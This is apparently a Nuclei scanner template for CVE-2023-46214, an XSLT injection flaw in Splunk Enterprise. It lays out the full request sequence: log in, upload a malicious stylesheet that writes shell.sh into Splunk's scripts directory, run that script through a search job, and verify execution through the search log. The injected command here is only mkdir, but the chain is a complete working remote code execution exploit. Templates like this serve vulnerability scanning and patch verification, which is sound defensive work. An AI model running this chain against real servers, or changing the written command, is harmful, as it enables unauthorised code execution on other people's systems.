http:
- extractors:
  - internal: true
    kval:
    - cval
    name: cval
    part: cookie
    type: kval
  raw:
  - 'GET /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- extractors:
  - internal: true
    kval:
    - splunkweb_csrf_token_8000
    name: csrf_1
    part: cookie
    type: kval
  raw:
  - 'POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    '
  redirects: true
- extractors:
  - internal: true
    json:
    - .messages[0].text
    name: text_value
    part: body
    type: json
  raw:
  - "POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path={{filename}}.xsl\
    \ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=8d047bf6a7fc6ed1e8a2d789c657e3af\n\
    X-Requested-With: XMLHttpRequest\nX-Splunk-Form-Key: {{csrf_1}}\n\n--8d047bf6a7fc6ed1e8a2d789c657e3af\n\
    Content-Disposition: form-data; name=\"spl-file\"; filename=\"{{filename}}.xsl\"\
    \nContent-Type: application/xslt+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"\
    ?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\
    \ xmlns:exsl=\"http://exslt.org/common\" extension-element-prefixes=\"exsl\">\n\
    \  <xsl:template match=\"/\">\n    <exsl:document href=\"/opt/splunk/bin/scripts/shell.sh\"\
    \ method=\"text\">\n        <xsl:text>mkdir /opt/splunk/var/run/splunk/dispatch/{{randint}}</xsl:text>\n\
    \    </exsl:document>\n  </xsl:template>\n</xsl:stylesheet>\n--8d047bf6a7fc6ed1e8a2d789c657e3af--\n"
- extractors:
  - internal: true
    json:
    - .sid
    name: jsid
    part: body
    type: json
  raw:
  - 'POST /en-US/splunkd/__raw/servicesNS/{{username}}/search/search/jobs?output_mode=json
    HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    X-Splunk-Form-Key: "{{csrf_1}}"

    Content-Type: application/x-www-form-urlencoded


    search=%7Csearch+test%7Chead+1

    '
- extractors:
  - internal: true
    kval:
    - splunkweb_csrf_token_8000
    name: csrf_2
    part: cookie
    type: kval
  raw:
  - 'POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    '
  redirects: true
- raw:
  - 'GET /en-US/api/search/jobs/{{jsid}}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{{text_value}}/{{filename}}.xsl
    HTTP/1.1

    Host: {{Hostname}}

    X-Splunk-Module: Splunk.Module.DispatchingModule

    X-Requested-With: XMLHttpRequest

    '
- extractors:
  - internal: true
    name: sid
    type: xpath
    xpath:
    - //sid/text()
  raw:
  - 'POST /en-US/splunkd/__raw/servicesNS/{{username}}/search/search/jobs HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    X-Splunk-Form-Key: "{{csrf_2}}"


    search=|runshellscript "shell.sh" "" "" "" "" "" "" "" "{{jsid}}"

    '
- extractors:
  - internal: true
    kval:
    - splunkweb_csrf_token_8000
    name: csrf_3
    part: cookie
    type: kval
  raw:
  - 'POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    '
  redirects: true
- matchers:
  - part: header
    type: word
    words:
    - '{{randint}}'
  - status:
    - 200
    type: status
  - negative: true
    part: body
    type: word
    words:
    - FATAL
    - ERROR
  matchers-condition: and
  raw:
  - 'GET /en-US/splunkd/__raw/services/search/jobs/{{randint}}/search.log HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-46214
info:
  author: jackhax
  classification:
    cpe: cpe:2.3:a:splunk:splunk:*:*:*:*:enterprise:*:*:*
    cve-id: CVE-2023-46214
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-91
    epss-percentile: 0.129
    epss-score: 0.05
  description: 'In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise
    does not safely sanitize extensible stylesheet language transformations (XSLT)
    that users supply. This means that an attacker can upload malicious XSLT which
    can result in remote code execution on the Splunk Enterprise instance.

    '
  impact: 'Successful exploitation of this vulnerability could allow an authenticated
    attacker to perform remote code execution.

    '
  metadata:
    max-request: 13
    product: Splunk Enterprise
    vendor: Splunk
    verified: true
  name: Splunk Enterprise < 9.1.2 - XML Injection
  reference:
  - https://advisory.splunk.com/advisories/SVD-2023-1104
  - https://github.com/nathan31337/Splunk-RCE-poc
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46214
  remediation: 'Upgrade Splunk Enterprise to either 9.0.7 or 9.1.2. Or limit the ability
    of search job requests to accept XSL as valid input.

    '
  severity: high
  tags: cve2023,cve,rce,splunk,xml
variables:
  filename: '{{rand_base(6)}}'
  randint: '{{rand_int(1000000000,9999999999)}}'
